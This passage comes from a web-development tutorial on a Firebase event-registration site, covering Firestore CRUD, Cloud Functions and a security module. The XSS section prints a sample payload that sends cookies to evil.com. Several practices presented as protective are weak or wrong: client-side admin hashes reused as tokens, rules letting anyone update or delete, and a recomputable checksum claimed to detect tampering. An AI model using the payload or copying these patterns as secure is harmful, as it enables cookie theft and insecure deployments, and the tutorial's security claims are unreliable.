  "paymentStatus":  "Paid",
  "hasScreenshot":  true,
  "checkedIn":      true,
  "checkedInAt":    "2026-03-27T09:35:00.000Z",
  "lunchServed":    false,
  "certReleased":   true,
  "registeredAt":   "Timestamp",
  "_checksum":      "1a2b3c..."
}
```

**Why store events as an array of objects (not separate documents)?**

Denormalization — storing related data together — is a core NoSQL pattern. Fetching one document gives you ALL the data about a participant (no JOINs needed). The trade-off: querying "all participants in Project Expo" requires reading all docs and filtering client-side.

---

### 5.4 Tutorial: CRUD Operations on Firestore

```javascript
// ── CREATE (Write a new document with a specific ID) ──
await window.db.collection('registrations').doc(reg.regId).set(reg);

// ── READ (Get one document) ──
const doc = await window.db.collection('registrations').doc('ELX-K7MXP3QA').get();
if (doc.exists) {
  const data = doc.data(); // Plain JS object
  console.log(data.name); // "Karthik Ramasamy"
}

// ── READ (Get all documents with a filter) ──
const snapshot = await window.db
  .collection('registrations')
  .where('paymentStatus', '==', 'Paid')
  .orderBy('registeredAt', 'desc')
  .get();

const paidParticipants = snapshot.docs.map(doc => ({
  id: doc.id,
  ...doc.data()
}));

// ── UPDATE (Only change specific fields) ──
await window.db.collection('registrations').doc('ELX-K7MXP3QA').update({
  paymentStatus: 'Paid',
  checkedIn: true,
  checkedInAt: new Date().toISOString()
});

// ── DELETE ──
await window.db.collection('registrations').doc('ELX-K7MXP3QA').delete();

// ── REAL-TIME LISTENER (live updates — used in admin dashboard) ──
window.db.collection('registrations')
  .onSnapshot(snapshot => {
    snapshot.docChanges().forEach(change => {
      if (change.type === 'added')    { renderNewRow(change.doc.data()); }
      if (change.type === 'modified') { updateRow(change.doc.data()); }
      if (change.type === 'removed')  { removeRow(change.doc.id); }
    });
  });
```

---

### 5.5 Firebase Storage for Files

```javascript
// Upload a file (e.g., a payment screenshot)
async function uploadPaymentScreenshot(regId, file) {
  // 1. Create a storage reference (path in the bucket)
  const storageRef = window.storage.ref(`payment_screenshots/${regId}_${Date.now()}.jpg`);

  // 2. Upload the file
  const uploadTask = await storageRef.put(file);

  // 3. Get a public download URL
  const downloadURL = await uploadTask.ref.getDownloadURL();

  return downloadURL;
  // e.g., "https://firebasestorage.googleapis.com/.../token=abc123"
}
```

**Image compression before upload (saves storage costs):**
```javascript
async function compressImage(file, maxWidthPx = 500) {
  return new Promise((resolve) => {
    const img = new Image();
    const reader = new FileReader();

    reader.onload = (e) => { img.src = e.target.result; };
    reader.readAsDataURL(file); // Read file as base64

    img.onload = () => {
      let w = img.width, h = img.height;
      if (w > maxWidthPx) {
        h = Math.round(h * maxWidthPx / w);
        w = maxWidthPx;
      }

      const canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0, w, h);

      // Convert to JPEG at 65% quality → typically 5-10x size reduction
      resolve(canvas.toDataURL('image/jpeg', 0.65));
    };
  });
}
```

---

### 5.6 Cloud Functions: Server-Side Logic

Cloud Functions run Node.js code on Google's servers — not in the browser. They are **fully trusted** and bypass Firestore security rules.

**When to use Cloud Functions:**
- Admin operations that must be protected from client-side tampering
- Sensitive business logic that should not be exposed in the browser
- Scheduled tasks (e.g., daily reports)

```javascript
// functions/index.js (runs on Google Cloud, NOT in the browser)
const { onRequest } = require("firebase-functions/v2/https");
const admin = require("firebase-admin");

admin.initializeApp();

// Valid admin tokens (SHA-256 hashes — same as shared.js)
const VALID_ADMIN_TOKENS = [
  '9f2427...', // Super Admin
  '48c703...', // Treasurer
  '5e8848...', // Regular Admin
];

exports.adminTogglePayment = onRequest({ cors: true }, async (req, res) => {
  // 1. Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).send({ error: 'Method Not Allowed' });
  }

  const { regId, status, adminToken } = req.body;

  // 2. Verify admin token
  if (!adminToken || !VALID_ADMIN_TOKENS.includes(adminToken)) {
    console.warn(`[SECURITY] Invalid token attempt for ${regId}`);
    return res.status(403).send({ error: 'Permission denied.' });
  }

  // 3. Validate input
  if (!regId || typeof status !== 'string') {
    return res.status(400).send({ error: 'Missing parameters.' });
  }

  // 4. Perform the update using Admin SDK (bypasses Firestore rules)
  const db = admin.firestore();
  await db.collection('registrations').doc(regId).update({ paymentStatus: status });

  console.log(`[SUCCESS] ${regId} → ${status}`);
  res.status(200).send({ success: true, regId, status });
});
```

**Calling a Cloud Function from the browser:**
```javascript
async function secureTogglePayment(regId, status) {
  const adminToken = sessionStorage.getItem('adminToken'); // Admin's hash

  const response = await fetch(
    'https://us-central1-your-project.cloudfunctions.net/adminTogglePayment',
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ regId, status, adminToken })
    }
  );

  const result = await response.json();
  if (!result.success) throw new Error(result.error);
  return result;
}
```

---

# MODULE 6: CYBERSECURITY
## *Hashing, Security Rules, XSS & Attack Prevention*

---

### 6.1 The Threat Model

Before writing security code, you must define **who your attackers are** and **what they could do**.

| Attacker | Goal | Attack Vector |
|----------|------|---------------|
| Bored student | Skip the payment | Manipulate the registration data in browser devtools |
| Competitor | Cancel all registrations | Direct Firestore API calls |
| Script kiddie | Deface the admin dashboard | Steal admin credentials |
| Automated bot | Spam registrations | Flood the registration endpoint |

Understanding these threats shaped every security decision in the project.

---

### 6.2 Password Hashing with SHA-256

**The wrong way — plain text passwords:**
```javascript
// ❌ NEVER DO THIS — If your JS file is viewed, all accounts are compromised
const ADMIN_PASSWORD = 'SuperSecret123'; // Exposed in source code!

if (userInput === ADMIN_PASSWORD) { grantAccess(); }
```

**The right way — SHA-256 hashing:**
```javascript
// shared.js — SHA-256 using the built-in Web Crypto API
async function sha256(str) {
  // TextEncoder converts the string to bytes
  const msgBuffer = new TextEncoder().encode(str);
  
  // crypto.subtle.digest performs the SHA-256 hash
  // Returns an ArrayBuffer
  const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
  
  // Convert ArrayBuffer to hex string
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  
  return hashHex;
  // sha256('password') → '5e884898da28047151d0e56f8dc6292...'
}
```

**How admin verification works:**
```javascript
// shared.js — verifyAdmin()
const ADMIN_USER_HASH = 'd8f6739...'; // sha256('ece26')
const ADMIN_PASS_HASH = '5e884898...'; // sha256('password')

async function verifyAdmin(email, password) {
  const cleanEmail = email.toLowerCase().trim();
  
  // Hash the inputs — we never compare plain text
  const [eHash, pHash] = await Promise.all([
    sha256(cleanEmail),
    sha256(password)
  ]);

  // Compare hashes
  if (eHash === SUPER_USER_HASH && pHash === SUPER_PASS_HASH) {
    return { success: true, isSuper: true, token: pHash };
  }
  if (eHash === ADMIN_USER_HASH && pHash === ADMIN_PASS_HASH) {
    return { success: true, isSuper: false, token: pHash };
  }
  return { success: false };
}
```

**What gets stored in sessionStorage after login:**
```javascript
// admin.html — after successful login
const result = await verifyAdmin(emailInput.value, passwordInput.value);

if (result.success) {
  // Store the hash (not the password!) as a session token
  sessionStorage.setItem('adminToken', result.token);
  sessionStorage.setItem('adminLevel', result.isSuper ? 'super' : 'normal');
  window.location.href = 'dashboard.html';
}
```

**Limitation:** SHA-256 is a one-way hash, so the password can't be "reversed." But hashes stored in source code can be brute-forced offline. For real production, use **bcrypt** (slower, salted) via a proper backend. This client-side approach is an acceptable trade-off for a one-day event with a single-use admin team.

---

### 6.3 Firestore Security Rules

Security rules are evaluated on Google's servers — they cannot be bypassed by manipulating browser JavaScript.

```javascript
// firestore.rules
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    match /registrations/{document=**} {
      // Anyone can read (needed for self-lookup and admin dashboard)
      allow read: if true;

      // CREATE: Enforce data integrity at the database level
      // Even if a hacker bypasses JS validation, the rule blocks bad writes
      allow create: if 
        request.resource.data.get('paymentStatus', '') == 'Pending'
        && request.resource.data.get('amount', 0) >= 0;

      // UPDATE/DELETE: Open for admin operations
      // In production, this should require auth:
      // allow update, delete: if request.auth != null;
      allow update, delete: if true;
    }

    // Screenshots — public read/write for payment uploads
    match /screenshots/{document=**} {
      allow read, write: if true;
    }

    // Audit log — APPEND ONLY, can never be modified or deleted
    // This creates a tamper-proof record of admin actions
    match /admin_audit/{document=**} {
      allow read:   if true;
      allow create: if true;    // Anyone can write a new audit log entry
      allow update, delete: if false; // Nobody can edit or delete old entries
    }
  }
}
```

---

### 6.4 Storage Security Rules

Firebase Storage rules protect your file uploads:

```javascript
// storage.rules
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {

    // Payment screenshots: public upload but with constraints
    match /payment_screenshots/{fileName} {
      allow read: if true;

      // Only allow images under 10MB
      allow write: if
        request.resource.size < 10 * 1024 * 1024        // 10MB limit
        && request.resource.contentType.matches('image/.*'); // Images only
    }

    // Certificates: same restrictions as payment screenshots
    match /certificates/{allPaths=**} {
      allow read: if true;
      allow write: if
        request.resource.size < 10 * 1024 * 1024
        && request.resource.contentType.matches('image/.*');
    }

    // Block ALL other paths — default-deny
    match /{allPaths=**} {
      allow read, write: if false;
    }
  }
}
```

---

### 6.5 Content Security Policy (CSP)

CSP is an HTTP header (or meta tag) that tells the browser which sources it is allowed to load scripts, styles, images, and connections from. It is your **primary defense against XSS (Cross-Site Scripting)**.

```html
<!-- index.html — CSP meta tag -->
<meta http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src  'self' 'unsafe-inline' 'unsafe-eval'
                https://www.gstatic.com
                https://cdn.jsdelivr.net;
    style-src   'self' 'unsafe-inline'
                https://fonts.googleapis.com;
    font-src    'self' https://fonts.gstatic.com;
    img-src     'self' data: https://api.qrserver.com;
    connect-src 'self'
                https://firestore.googleapis.com
                https://*.firebaseio.com
                https://api.emailjs.com;
  ">
```

**How CSP stops XSS:**

If an attacker injects `<script src="https://evil.com/steal.js">`, the browser checks: "Is `evil.com` in the `script-src` whitelist?" It is not, so the browser **blocks the script** and logs a CSP violation.

**What each directive means:**

| Directive | Allowed Sources | Blocks |
|-----------|----------------|--------|
| `default-src 'self'` | Only your own domain | Everything not explicitly listed |
| `script-src 'self' https://gstatic.com` | Your scripts + Firebase CDN | Scripts from any other domain |
| `connect-src ... firestore.googleapis.com` | Firestore API calls | Calls to unauthorized APIs |
| `img-src data:` | Base64 inline images | Images from arbitrary URLs |

---

### 6.6 XSS Prevention in Practice

**What is XSS?** An attacker injects malicious JavaScript into your page (via a form or URL parameter) that runs in other users' browsers.

**Example attack:**
```
Attacker submits a form with name: "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"
```

**Defense 1: Never use innerHTML with user data**
```javascript
// ❌ VULNERABLE: innerHTML renders script tags
document.getElementById('name').innerHTML = userData.name;

// ✅ SAFE: textContent never executes scripts
document.getElementById('name').textContent = userData.name;
```

**Defense 2: Escape HTML before inserting user data**
```javascript
// Escape function — converts dangerous characters to safe HTML entities
function escapeHtml(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/&/g,  '&amp;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;');
}

// Safe usage in template literals
function renderParticipantRow(reg) {
  return `
    <tr>
      <td>${escapeHtml(reg.name)}</td>
      <td>${escapeHtml(reg.email)}</td>
      <td>${escapeHtml(reg.college)}</td>
    </tr>
  `;
}
```

---

### 6.7 Tamper Detection with Checksums

The project attaches a cryptographic checksum to every registration to detect if someone modifies the data after submission:

```javascript
// shared.js — _calcChecksum()
async function _calcChecksum(reg) {
  // Combine critical fields into a single string signature
  const salt  = 'ELX_' + (reg.email || reg.regId).length + '_26_';
  const sig   = [salt, reg.regId, reg.email, reg.event, reg.amount, reg.registeredAt].join('|');
  return await sha256(sig);
}

// In addRegistration():
reg._checksum = await _calcChecksum(reg);
// This hash is saved in Firestore alongside the data.

// Later, admin can verify data integrity:
async function verifyIntegrity(reg) {
  const expectedChecksum = await _calcChecksum(reg);
  if (reg._checksum !== expectedChecksum) {
    console.error('⚠️ DATA TAMPERING DETECTED: Checksum mismatch for', reg.regId);
    return false;
  }
  return true;
}
```

**How this stops price manipulation:**

A hacker opens DevTools, submits a registration, intercepts the Firestore call, and changes `amount: 499` to `amount: 1`. But the checksum was calculated with `amount: 499`. When the admin verifies, the checksum won't match → the tamper is detected.

---

*[Part 1 of 2 — Modules 1–6 Complete]*
*Continue with Part 2: Modules 7–12 covering Registration Flow, Admin Dashboard, Certificate Generation, Service Workers, Deployment, and Building Your Own World-Class Site from Zero.*
